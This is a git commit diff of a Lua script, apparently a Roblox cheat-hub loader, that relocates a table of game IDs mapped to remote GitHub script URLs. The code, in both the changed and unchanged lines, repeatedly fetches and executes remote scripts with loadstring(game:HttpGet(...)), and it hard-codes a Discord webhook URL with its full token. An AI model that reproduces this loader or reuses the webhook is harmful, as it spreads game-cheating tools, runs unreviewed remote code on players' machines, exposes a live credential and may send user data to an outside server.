73e9aaba2ce74b7d931728112aeb3ee44e4f61dc
sigilwd <136939217+sigilwd@users.noreply.github.com>
2023-09-07 22:14:13 -0400

    Update aoi.lua

--- aoi.lua
+++ aoi.lua
@@ -3,23 +3,6 @@
 ]]
 setfpscap(10000)
 
-local gameLinks = {
-    [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
-    [12355337193] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
-    [3214114884] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/flagwars.lua",
-    [6722284015] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/pistol1v1.lua",
-    [4410049285] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/drivingsimulator.lua",
-    [13771457545] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
-    [13775113583] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
-}
-
-if gameLinks[game.PlaceId] ~= nil then
-    loadstring(game:HttpGet(gameLinks[game.PlaceId]))()
-else
-    warn("Not Supported")
-end
-
-wait(0.5)
 -- // WebHook URL
 WebHook = "https://discord.com/api/webhooks/1149514476329127987/XG2pbitNR5aWjAWOh6XBcFe1Ism-7Tv_EvAKgmeC29Y_R9TOj0BdGWjETZvEU1R7itLZ"
 -- // Modify your WebHook field
@@ -75,3 +58,19 @@ Content = ""
        Flags = nil
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/2.0.lua", true))()
+
+local gameLinks = {
+    [1962086868] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/toh.lua",
+    [12355337193] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
+    [3214114884] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/flagwars.lua",
+    [6722284015] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/pistol1v1.lua",
+    [4410049285] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/drivingsimulator.lua",
+    [13771457545] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
+    [13775113583] = "https://raw.githubusercontent.com/sigilwd/KongerHub/main/mvsd.lua",
+}
+
+if gameLinks[game.PlaceId] ~= nil then
+    loadstring(game:HttpGet(gameLinks[game.PlaceId]))()
+else
+    warn("Not Supported")
+end
